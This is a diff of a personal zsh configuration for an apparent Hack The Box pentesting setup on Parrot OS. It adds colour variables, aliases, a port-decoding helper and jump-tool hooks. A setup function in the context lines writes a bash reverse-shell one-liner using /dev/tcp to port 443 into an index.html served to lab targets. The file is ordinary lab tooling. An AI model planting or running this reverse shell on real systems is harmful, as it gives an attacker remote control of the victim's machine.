@@ -1,6 +1,24 @@
 # ~/.zshrc
 # Prompt
+#Colors
  
+endcolor="\033[0m\e[0m"
+ 
+green="\e[0;32m\033[1m"
+red="\e[0;31m\033[1m"
+blue="\e[0;34m\033[1m"
+yellow="\e[0;33m\033[1m"
+purple="\e[0;35m\033[1m"
+turquoise="\e[0;36m\033[1m"
+gray="\e[0;37m\033[1m"
+negro="\e[0;30m\033[1m"
+fondonegro="\e[0;40m\033[1m"
+fondoverde="\e[0;42m\033[1m"
+fondoamarillo="\e[0;43m\033[1m"
+fondoazul="\e[0;44m\033[1m"
+fondopurple="\e[0;46m\033[1m"
+fondogris="\e[0;47m\033[1m"
+
  
 if [[ $EUID -ne 0 ]]; then    
     PROMPT="%F{#00FFFF}$USER%f%F{#FBFF00}@%f%F{red}parrot [%f%F{#00FF00}%d%f%F{red}]%(?..[%?])%f%F{#FFFF00}$ %f"
@@ -15,7 +33,7 @@ export PATH=/home/kermit/.local/bin:/usr/share/responder:/usr/share/ghidra:/usr/
 # Add as ~/.zshrc
 export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
 export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
-export _JAVA_AWT_WM_NONREPARENTING=1
+export _JAVA_AWT_WM_NONREPARENTING=1 
  
 function ipt()
 {
@@ -41,16 +59,30 @@ function rot13()
 {
   echo "$@" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
 }
- 
+function pin()
+{
+  jump pin $1
+}
+function unpin()
+{
+  jump unpin $1
+}
+function procnet()
+{
+  echo; for port in $(cat $1 | awk '{print $2}' | grep -v "local" | awk '{print $2}' FS=":" | sort -u); do echo "${yellow}[+]${endcolor} Port $port -> ${red} $((0x$port))\n" ${endcolor}; done | sort -n; echo
+}
 # alias
+alias pins='jump pins'
+alias js='js-beautify'
 alias mach='cd /home/kermit/maquinas/$name'
 alias des='cd /home/kermit/Descargas/firefox'
-alias dis='dirs -v'
-alias pop='popd'
-alias pus='pushd'
+# alias dis='dirs -v'
+#alias pop='popd'
+#alias pus='pushd'
 # Alias's for multiple directory listing commands
-alias la='lsd -Aalh' # show hidden files
-alias ls='lsd -aFh --color=always' # add colors and file type extensions
+#alias la='lsd -Aalh' # show hidden files
+#alias ls='lsd -aFh --color=always' # add colors and file type extensions
+alias ls='lsd'
 alias lx='lsd -lXBh' # sort by extension
 alias lk='lsd -lSrh' # sort by size
 alias lc='lsd -lcrh' # sort by change time
@@ -148,7 +180,7 @@ ftext ()
 	# -r recursive search
 	# -n causes line number to be printed
 	# optional: -F treat search term as a literal, not a regular expression
-	 optional: -l only print filenames and not the matching lines ex. grep -irl "$1" *
+	optional: -l only print filenames and not the matching lines ex. grep -irl "$1" *
 	grep -iIHrn --color=always "$1" . | less -r
 }
  
@@ -173,19 +205,15 @@ cpp()
 	END { print "" }' total_size=$(stat -c '%s' "${1}") count=0
 }
  
- 
- 
 #Automatically do an ls after each cd
-cd ()
-{
-  if [ -n "$1" ]; then
-  	builtin cd "$@" && ls
- 	else
- 		builtin cd ~ && ls
- 	fi
-}
- 
- 
+#cd ()
+#{
+#  if [ -n "$1" ]; then
+#  	builtin cd "$@" && ls
+# 	else
+# 		builtin cd ~ && ls
+# 	fi
+#}
  
 # IP address lookup
 alias whatismyip="whatsmyip"
@@ -241,24 +269,6 @@ source /home/kermit/.zsh/zsh-autocomplete/zsh-autocomplete.plugin.zsh
 #fi
  
  
-#Colors
- 
-endcolor="\033[0m\e[0m"
- 
-green="\e[0;32m\033[1m"
-red="\e[0;31m\033[1m"
-blue="\e[0;34m\033[1m"
-yellow="\e[0;33m\033[1m"
-purple="\e[0;35m\033[1m"
-turquoise="\e[0;36m\033[1m"
-gray="\e[0;37m\033[1m"
-negro="\e[0;30m\033[1m"
-fondonegro="\e[0;40m\033[1m"
-fondoverde="\e[0;42m\033[1m"
-fondoamarillo="\e[0;43m\033[1m"
-fondoazul="\e[0;44m\033[1m"
-fondopurple="\e[0;46m\033[1m"
-fondogris="\e[0;47m\033[1m"
  
 function funciones(){
   echo -e "\n\t${blue}[+]${endcolor} ${green}htbvpn${endcolor} Ejecuta la VPN descargada en ${red}/descargas/firefox${endcolor}"
@@ -273,11 +283,8 @@ function funciones(){
   echo -e "\n\t${blue}[+]${endcolor} ${green}f${endcolor} Busca un archivo en el directorio actual" 
   echo -e "\n\t${blue}[+]${endcolor} ${green}ftext${endcolor} Busca una cadena entre los archivos del directorio actual" 
   echo -e "\n\t${blue}[+]${endcolor} ${green}extract${endcolor} Extrae un archivo comprimido\n" 
- 
- 
- 
- 
 }
+
 #funciones
 function htbvpn(){
 sudo /usr/sbin/openvpn /home/kermit/Descargas/*.ovpn
@@ -287,6 +294,7 @@ function rmk(){
   scrub -p dod $1
   shred -zun 10 -v $1
 }
+
 function helpPanel(){
 echo -ne "\n\t${red}[!]${endcolor} Es necesario especificar ambos parametros"
 echo -ne "\n\n\t\t${blue}[+]${endcolor} Parametro ${red}-i${endcolor} especifica la ip"
@@ -353,8 +361,8 @@ if [ "$IFACE" = "tun0" ]; then
   mkdir /home/kermit/maquinas/$nombre_maquina
   mkdir /home/kermit/maquinas/$nombre_maquina/content
   mkdir /home/kermit/maquinas/$nombre_maquina/recon
-  touch /home/kermit/maquinas/$nombre_maquina/scan
-  touch /home/kermit/maquinas/$nombre_maquina/credentials
+  touch /home/kermit/maquinas/$nombre_maquina/nmap.txt
+  touch /home/kermit/maquinas/$nombre_maquina/cred.txt
   touch /home/kermit/maquinas/$nombre_maquina/index.html
   chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
   echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
@@ -367,9 +375,9 @@ if [ "$IFACE" = "tun0" ]; then
 else
   echo "\n\n\t${red}[!]${endcolor} Error al crear index.html, ip de interfaz tun0 no disponible"
   echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
-  echo -ne "\n\n"
-  export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
-  export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
+  echo -ne "\n\n";
+  ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt);
+  name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt);
   tput cnorm
 fi
 }
@@ -434,5 +442,27 @@ preexec () { print -Pn "\e]0;$1 - Parrot Terminal\a" }
  
 # Created by `pipx` on 2022-10-23 17:28:32
 export PATH="$PATH:/root/.local/bin"
- 
+ # Put the line below in ~/.zshrc:
+#
+#   eval "$(jump shell zsh)"
+#
+# The following lines are autogenerated:
+
+__jump_chpwd() {
+  jump chdir
+}
+
+jump_completion() {
+  reply="'$(jump hint "$@")'"
+}
+
+j() {
+  local dir="$(jump cd $@)"
+  test -d "$dir" && cd "$dir"
+}
+
+typeset -gaU chpwd_functions
+chpwd_functions+=__jump_chpwd
+
+compctl -U -K jump_completion j
 #
